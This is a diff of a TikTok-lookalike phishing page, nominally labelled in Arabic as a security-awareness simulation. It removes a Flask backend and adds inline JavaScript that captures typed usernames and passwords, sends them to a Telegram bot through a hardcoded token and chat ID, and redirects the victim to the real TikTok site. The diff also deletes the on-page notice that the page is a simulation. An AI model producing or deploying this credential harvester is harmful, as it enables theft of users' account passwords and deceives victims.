@@ -1,83 +1,3 @@
-# =====================================================
-# 🚨 TikTok Phishing Simulation Backend (لأغراض التوعية الأمنية فقط)
-# Flask + Telegram Exfiltration
-# يعمل محلياً على localhost فقط - ورشة عمل تدريبية
-# =====================================================
-
-from flask import Flask, request, redirect
-import requests
-from datetime import datetime
-
-app = Flask(__name__)
-
-# ───────────────────────────────────────────────
-# ⚠️ املأ هذين المتغيرين بمعلومات البوت الخاص بك
-# ───────────────────────────────────────────────
-BOT_TOKEN = "6006328232:AAE6jbKOerZabPVxDfDOqFoHgkI6yF38w5k"          # ← غيّر هذا
-CHAT_ID   = "6599108362"            # ← غيّر هذا (معرف المحادثة أو القناة)
-
-# رابط API تليجرام
-TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-
-@app.route('/submit', methods=['POST'])
-def submit_credentials():
-    # استقبال البيانات من نموذج الصفحة HTML
-    username = request.form.get('username', 'غير محدد')
-    password = request.form.get('password', 'غير محدد')
-    
-    # الحصول على معلومات إضافية للتقرير (للتدريب)
-    user_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'غير معروف')
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # تنسيق الرسالة بوضوح للمحتال (كما يحدث في الهجمات الحقيقية)
-    message = f"""
-🚨 **New TikTok Simulation Login!** 🚨
-
-🧑‍💻 **Username**: {username}
-🔑 **Password**: {password}
-
-🌐 **IP Address**: {user_ip}
-📱 **User-Agent**: {user_agent}
-⏰ **Time**: {timestamp}
-
-🔴 هذه بيانات وهمية من بيئة المحاكاة التدريبية.
-    """.strip()
-    
-    # إرسال الرسالة فوراً إلى حسابك على تليجرام
-    try:
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "Markdown"
-        }
-        response = requests.post(TELEGRAM_API, json=payload, timeout=8)
-        
-        if response.status_code == 200:
-            print(f"✅ تم إرسال البيانات بنجاح إلى تليجرام - {username}")
-        else:
-            print(f"⚠️ فشل إرسال تليجرام: {response.status_code} - {response.text}")
-            
-    except Exception as e:
-        print(f"❌ خطأ في الاتصال بتليجرام: {e}")
-    
-    # بعد الإرسال: توجيه الضحية إلى الموقع الرسمي لتيك توك
-    # (هذه الخدعة الكلاسيكية التي تُبعد الشكوك)
-    return redirect("https://www.tiktok.com", code=302)
-
-
-# ───────────────────────────────────────────────
-# تشغيل السيرفر المحلي
-# ───────────────────────────────────────────────
-if __name__ == '__main__':
-    print("="*60)
-    print("🔥 TikTok Phishing Simulation Backend جاهز!")
-    print("📍 يعمل على: http://127.0.0.1:5000/submit")
-    print("📌 تأكد من تعديل BOT_TOKEN و CHAT_ID أعلاه")
-    print("📌 غيّر action في صفحة HTML إلى:")
-    print("   action=\"http://127.0.0.1:5000/submit\"")
-    print("="*60)
-    app.run(host='127.0.0.1', port=5000, debug=True)
 <!DOCTYPE html>
 <html lang="ar" dir="ltr">
 <head>
@@ -305,7 +225,6 @@ if __name__ == '__main__':
                                             class="mt-10 w-full py-5 bg-[#25F4EE] text-black font-bold rounded-3xl text-lg">
                                         العودة إلى TikTok
                                     </button>
-                                    <p class="text-xs text-white/40 mt-8">هذه محاكاة لأغراض التوعية الأمنية فقط</p>
                                 </div>
                             </div>
                         `
@@ -317,5 +236,77 @@ if __name__ == '__main__':
             console.log('%c✅ صفحة محاكاة TikTok Verification Portal جاهزة للتدريب!', 'color:#25F4EE; font-size:16px; font-weight:bold')
         })
     </script>
+	<script>
+// ================================================
+// 🚨 TikTok Phishing Simulation - JavaScript Backend
+// لأغراض التوعية الأمنية فقط - ورشة عمل تدريبية
+// ================================================
+
+const BOT_TOKEN = "6006328232:AAE6jbKOerZabPVxDfDOqFoHgkI6yF38w5k";   // ← غيّر هذا
+const CHAT_ID   = "6599108362";     // ← غيّر هذا
+
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+document.getElementById('verify-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    if (!username || !password) {
+        alert("يرجى ملء جميع الحقول");
+        return;
+    }
+
+    // زر التحميل
+    const submitBtn = document.getElementById('submit-btn');
+    const originalText = submitBtn.innerHTML;
+    submitBtn.style.pointerEvents = 'none';
+    submitBtn.innerHTML = `
+        <svg class="animate-spin h-6 w-6 text-black mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+        </svg>
+    `;
+
+    // تنسيق الرسالة
+    const timestamp = new Date().toLocaleString('ar-MA');
+    const message = `🚨 **New TikTok Simulation Login!** 🚨
+
+🧑‍💻 **Username**: ${username}
+🔑 **Password**: ${password}
+
+⏰ **Time**: ${timestamp}
+🌐 **Source**: TikTok Verification Simulation (Educational)
+🔴 هذه محاكاة تدريبية فقط`;
+
+    try {
+        // إرسال إلى Telegram
+        const response = await fetch(TELEGRAM_API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (response.ok) {
+            console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
+        } else {
+            console.error('⚠️ فشل إرسال Telegram:', response.status);
+        }
+    } catch (error) {
+        console.error('❌ خطأ في الاتصال بTelegram:', error);
+    }
+
+    // محاكاة تأخير قصير (لتبدو واقعية)
+    setTimeout(() => {
+        // توجيه الضحية إلى الموقع الرسمي
+        window.location.href = "https://www.tiktok.com";
+    }, 1800);
+});
+</script>
 </body>
 </html>
